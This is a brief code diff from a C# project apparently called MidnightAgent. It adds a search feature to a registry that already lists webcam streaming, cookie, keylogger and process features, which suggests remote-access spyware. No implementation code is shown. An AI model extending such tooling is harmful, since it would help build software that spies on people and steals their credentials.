@@ -31,6 +31,7 @@ namespace MidnightAgent.Features
                 new StreamCamFeature(),
                 new CookieFeature(),
                 new KeyloggerFeature(),
+                new SearchFeature(),
                 
                 // Process
                 new ProcessFeature(),
